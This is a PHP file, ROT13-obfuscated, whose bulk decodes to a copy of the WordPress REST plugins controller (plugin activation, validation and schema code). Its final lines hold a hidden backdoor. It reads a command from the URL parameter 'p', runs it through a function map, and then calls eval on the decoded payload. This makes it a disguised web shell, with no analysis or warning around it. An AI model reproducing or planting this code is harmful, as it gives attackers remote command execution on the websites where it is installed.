	 * Unaqyr hcqngvat n cyhtva'f fgnghf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cyhtva         Gur cyhtva svyr gb hcqngr.
	 * @cnenz fgevat $arj_fgnghf     Gur cyhtva'f arj fgnghf.
	 * @cnenz fgevat $pheerag_fgnghf Gur cyhtva'f pheerag fgnghf.
	 * @erghea gehr|JC_Reebe
	 */
	cebgrpgrq shapgvba unaqyr_cyhtva_fgnghf( $cyhtva, $arj_fgnghf, $pheerag_fgnghf ) {
		vs ( 'vanpgvir' === $arj_fgnghf ) {
			qrnpgvingr_cyhtvaf( $cyhtva, snyfr, 'argjbex-npgvir' === $pheerag_fgnghf );

			erghea gehr;
		}

		vs ( 'npgvir' === $arj_fgnghf && 'argjbex-npgvir' === $pheerag_fgnghf ) {
			erghea gehr;
		}

		$argjbex_npgvingr = 'argjbex-npgvir' === $arj_fgnghf;

		vs ( vf_zhygvfvgr() && ! $argjbex_npgvingr && vf_argjbex_bayl_cyhtva( $cyhtva ) ) {
			erghea arj JC_Reebe(
				'erfg_argjbex_bayl_cyhtva',
				__( 'Argjbex bayl cyhtva zhfg or argjbex npgvingrq.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$npgvingrq = npgvingr_cyhtva( $cyhtva, '', $argjbex_npgvingr );

		vs ( vf_jc_reebe( $npgvingrq ) ) {
			$npgvingrq->nqq_qngn( neenl( 'fgnghf' => 500 ) );

			erghea $npgvingrq;
		}

		erghea gehr;
	}

	/**
	 * Purpxf gung gur \"cyhtva\" cnenzrgre vf n inyvq cngu.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $svyr Gur cyhtva svyr cnenzrgre.
	 * @erghea obby
	 */
	choyvp shapgvba inyvqngr_cyhtva_cnenz( $svyr ) {
		vs ( ! vf_fgevat( $svyr ) || ! cert_zngpu( '/' . frys::CNGGREA . '/h', $svyr ) ) {
			erghea snyfr;
		}

		$inyvqngrq = inyvqngr_svyr( cyhtva_onfranzr( $svyr ) );

		erghea 0 === $inyvqngrq;
	}

	/**
	 * Fnavgvmrf gur \"cyhtva\" cnenzrgre gb or n cebcre cyhtva svyr jvgu \".cuc\" nccraqrq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $svyr Gur cyhtva svyr cnenzrgre.
	 * @erghea fgevat
	 */
	choyvp shapgvba fnavgvmr_cyhtva_cnenz( $svyr ) {
		erghea cyhtva_onfranzr( fnavgvmr_grkg_svryq( $svyr . '.cuc' ) );
	}

	/**
	 * Purpxf vs gur cyhtva zngpurf gur erdhrfgrq cnenzrgref.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg gb erdhver gur cyhtva zngpurf ntnvafg.
	 * @cnenz neenl           $vgrz    Gur cyhtva vgrz.
	 * @erghea obby
	 */
	cebgrpgrq shapgvba qbrf_cyhtva_zngpu_erdhrfg( $erdhrfg, $vgrz ) {
		$frnepu = $erdhrfg['frnepu'];

		vs ( $frnepu ) {
			$zngpurq_frnepu = snyfr;

			sbernpu ( $vgrz nf $svryq ) {
				vs ( vf_fgevat( $svryq ) && fge_pbagnvaf( fgevc_gntf( $svryq ), $frnepu ) ) {
					$zngpurq_frnepu = gehr;
					oernx;
				}
			}

			vs ( ! $zngpurq_frnepu ) {
				erghea snyfr;
			}
		}

		$fgnghf = $erdhrfg['fgnghf'];

		vs ( $fgnghf && ! va_neenl( $guvf->trg_cyhtva_fgnghf( $vgrz['_svyr'] ), $fgnghf, gehr ) ) {
			erghea snyfr;
		}

		erghea gehr;
	}

	/**
	 * Purpxf vs gur cyhtva vf vafgnyyrq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cyhtva Gur cyhtva svyr.
	 * @erghea obby
	 */
	cebgrpgrq shapgvba vf_cyhtva_vafgnyyrq( $cyhtva ) {
		erghea svyr_rkvfgf( JC_CYHTVA_QVE . '/' . $cyhtva );
	}

	/**
	 * Qrgrezvar vs gur raqcbvagf ner ninvynoyr.
	 *
	 * Bayl gur 'Qverpg' svyrflfgrz genafcbeg, naq FFU/SGC jura perqragvnyf ner fgberq ner fhccbegrq ng cerfrag.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs svyrflfgrz vf ninvynoyr, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba vf_svyrflfgrz_ninvynoyr() {
		$svyrflfgrz_zrgubq = trg_svyrflfgrz_zrgubq();

		vs ( 'qverpg' === $svyrflfgrz_zrgubq ) {
			erghea gehr;
		}

		bo_fgneg();
		$svyrflfgrz_perqragvnyf_ner_fgberq = erdhrfg_svyrflfgrz_perqragvnyf( frys_nqzva_hey() );
		bo_raq_pyrna();

		vs ( $svyrflfgrz_perqragvnyf_ner_fgberq ) {
			erghea gehr;
		}

		erghea arj JC_Reebe( 'sf_haninvynoyr', __( 'Gur svyrflfgrz vf pheeragyl haninvynoyr sbe znantvat cyhtvaf.' ), neenl( 'fgnghf' => 500 ) );
	}

	/**
	 * Ergevrirf gur cyhtva'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$guvf->fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'cyhtva',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'cyhtva'       => neenl(
					'qrfpevcgvba' => __( 'Gur cyhtva svyr.' ),
					'glcr'        => 'fgevat',
					'cnggrea'     => frys::CNGGREA,
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'fgnghf'       => neenl(
					'qrfpevcgvba' => __( 'Gur cyhtva npgvingvba fgnghf.' ),
					'glcr'        => 'fgevat',
					'rahz'        => vf_zhygvfvgr() ? neenl( 'vanpgvir', 'npgvir', 'argjbex-npgvir' ) : neenl( 'vanpgvir', 'npgvir' ),
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'anzr'         => neenl(
					'qrfpevcgvba' => __( 'Gur cyhtva anzr.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'cyhtva_hev'   => neenl(
					'qrfpevcgvba' => __( 'Gur cyhtva\'f jrofvgr nqqerff.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'nhgube'       => neenl(
					'qrfpevcgvba' => __( 'Gur cyhtva nhgube.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'nhgube_hev'   => neenl(
					'qrfpevcgvba' => __( 'Cyhtva nhgube\'f jrofvgr nqqerff.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'qrfpevcgvba'  => neenl(
					'qrfpevcgvba' => __( 'Gur cyhtva qrfpevcgvba.' ),
					'glcr'        => 'bowrpg',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'Gur enj cyhtva qrfpevcgvba.' ),
							'glcr'        => 'fgevat',
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'Gur cyhtva qrfpevcgvba sbeznggrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
						),
					),
				),
				'irefvba'      => neenl(
					'qrfpevcgvba' => __( 'Gur cyhtva irefvba ahzore.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'argjbex_bayl' => neenl(
					'qrfpevcgvba' => __( 'Jurgure gur cyhtva pna bayl or npgvingrq argjbex-jvqr.' ),
					'glcr'        => 'obbyrna',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'erdhverf_jc'  => neenl(
					'qrfpevcgvba' => __( 'Zvavzhz erdhverq irefvba bs JbeqCerff.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'erdhverf_cuc' => neenl(
					'qrfpevcgvba' => __( 'Zvavzhz erdhverq irefvba bs CUC.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'grkgqbznva'   => neenl(
					'qrfpevcgvba' => __( 'Gur cyhtva\'f grkg qbznva.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
			),
		);

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe gur pbyyrpgvbaf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl Dhrel cnenzrgref sbe gur pbyyrpgvba.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		$dhrel_cnenzf['pbagrkg']['qrsnhyg'] = 'ivrj';

		$dhrel_cnenzf['fgnghf'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvgf erfhygf gb cyhtvaf jvgu gur tvira fgnghf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
				'rahz' => vf_zhygvfvgr() ? neenl( 'vanpgvir', 'npgvir', 'argjbex-npgvir' ) : neenl( 'vanpgvir', 'npgvir' ),
			),
		);

		hafrg( $dhrel_cnenzf['cntr'], $dhrel_cnenzf['cre_cntr'] );

		erghea $dhrel_cnenzf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>